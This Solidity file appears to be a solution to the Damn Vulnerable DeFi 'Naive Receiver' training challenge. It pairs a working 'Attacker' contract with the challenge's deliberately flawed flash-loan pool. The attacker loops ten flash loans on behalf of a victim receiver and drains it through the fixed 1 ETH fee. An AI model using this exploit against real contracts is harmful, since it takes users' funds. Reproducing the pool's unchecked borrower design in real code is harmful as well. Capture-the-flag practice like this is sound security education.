// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";


contract Attacker {
    NaiveReceiverLenderPool private pool;
    constructor(address payable poolAddr) {
        console.log("constructorconstructorconstructor");
        pool = NaiveReceiverLenderPool(poolAddr);
    }

    function attack (address recepientAddr ) public   {
        // while(address(this).balance >= 0) {
          
            
            console.log('ATTACK', recepientAddr);
            uint i = 0;
            while(i < 10) {
                pool.flashLoan(recepientAddr, 1);
                i++;
            }
            // 
            // pool.flashLoan(addr, 1);
            // pool.flashLoan(addr, 1);
        // }
    }
}

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverLenderPool is ReentrancyGuard {

    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant {
        // console.log('====borrower', borrower); //0xcf7ed3acca5a467e9e704c703e8d87f634fb0fc9
        // console.log('====addr', address(this)); //0x5fbdb2315678afecb367f032d93f642f64180aa3
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");


        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            ),
            borrowAmount
        );
        
        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive () external payable {}
}
